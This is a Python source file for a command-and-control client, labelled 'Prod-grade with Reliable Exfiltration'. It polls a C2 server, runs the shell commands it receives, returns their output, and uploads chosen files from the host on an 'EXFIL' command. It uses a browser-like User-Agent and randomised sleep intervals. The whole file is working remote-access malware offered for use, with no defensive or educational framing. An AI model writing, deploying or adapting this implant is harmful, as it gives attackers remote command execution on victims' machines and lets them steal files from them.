# =======================
# client.py (Prod-grade with Reliable Exfiltration)
# =======================
import urllib.request
import urllib.error
import time
import os
import random
import mimetypes

C2_URL = "http://0.0.0.0:8000"  # Updated to 0.0.0.0:8000
HEADERS = {"User-Agent": "Mozilla/5.0"}

def exfil_file(filepath):
    if not os.path.isfile(filepath):
        return f"[!] File not found: {filepath}"

    try:
        filename = os.path.basename(filepath)
        
        # Parse URL
        from urllib.parse import urlparse
        parsed = urlparse(C2_URL + "/upload")
        
        # Create multipart form data
        boundary = f"----WebKitFormBoundary{random.randint(1000000000, 9999999999)}"
        
        # Read file
        with open(filepath, "rb") as f:
            file_content = f.read()
        
        # Build multipart body
        body = []
        body.append(f'--{boundary}')
        body.append(f'Content-Disposition: form-data; name="file"; filename="{filename}"')
        body.append(f'Content-Type: {mimetypes.guess_type(filepath)[0] or "application/octet-stream"}')
        body.append('')
        body_bytes = []
        for line in body:
            body_bytes.append(line.encode('utf-8'))
        body_bytes.append(file_content)
        body_bytes.append(''.encode('utf-8'))
        body_bytes.append(f'--{boundary}--'.encode('utf-8'))
        
        # Join with CRLF
        final_body = b'\r\n'.join(body_bytes)
        
        # Create request
        req = urllib.request.Request(
            parsed.geturl(),
            data=final_body,
            headers={
                **HEADERS,
                'Content-Type': f'multipart/form-data; boundary={boundary}',
                'X-Filename': filename
            },
            method='POST'
        )
        
        # Send request
        response = urllib.request.urlopen(req, timeout=10)
        if response.status == 200:
            return f"[+] File exfiltrated: {filename}"
        else:
            return f"[!] Upload failed: {response.status}"
            
    except urllib.error.HTTPError as e:
        return f"[!] HTTP error: {e.code} {e.reason}"
    except Exception as e:
        return f"[!] Exfil error: {e}"

if __name__ == "__main__":
    while True:
        try:
            # GET command from server
            req = urllib.request.Request(C2_URL, headers=HEADERS)
            response = urllib.request.urlopen(req, timeout=10)
            cmd = response.read().decode('utf-8').strip()
            
            if cmd:
                if cmd.startswith("EXFIL "):
                    path = cmd[6:].strip()
                    output = exfil_file(path)
                else:
                    # Execute command
                    try:
                        import subprocess
                        if os.name == 'nt':  # Windows
                            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                            output = result.stdout
                            if not output and result.stderr:
                                output = result.stderr
                            if not output:
                                output = "[+] Command executed with no output"
                        else:  # Unix/Linux
                            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                            output = result.stdout
                            if not output and result.stderr:
                                output = result.stderr
                            if not output:
                                output = "[+] Command executed with no output"
                    except subprocess.TimeoutExpired:
                        output = "[!] Command timed out"
                    except Exception as e:
                        output = f"[!] Command error: {e}"
                
                # POST result back to server
                data = output.encode('utf-8')
                req = urllib.request.Request(
                    C2_URL,
                    data=data,
                    headers={**HEADERS, 'Content-Type': 'text/plain'},
                    method='POST'
                )
                urllib.request.urlopen(req, timeout=10)
                
        except urllib.error.URLError as e:
            # Try to report connection errors back if possible
            try:
                error_msg = f"[!] Connection error: {e.reason if hasattr(e, 'reason') else str(e)}"
                req = urllib.request.Request(
                    C2_URL,
                    data=error_msg.encode('utf-8'),
                    headers={**HEADERS, 'Content-Type': 'text/plain'},
                    method='POST'
                )
                urllib.request.urlopen(req, timeout=5)
            except:
                pass  # If we can't report, just continue
        except Exception as e:
            # Generic exception handling
            try:
                error_msg = f"[!] Client error: {str(e)}"
                req = urllib.request.Request(
                    C2_URL,
                    data=error_msg.encode('utf-8'),
                    headers={**HEADERS, 'Content-Type': 'text/plain'},
                    method='POST'
                )
                urllib.request.urlopen(req, timeout=5)
            except:
                pass

        time.sleep(random.randint(5, 12))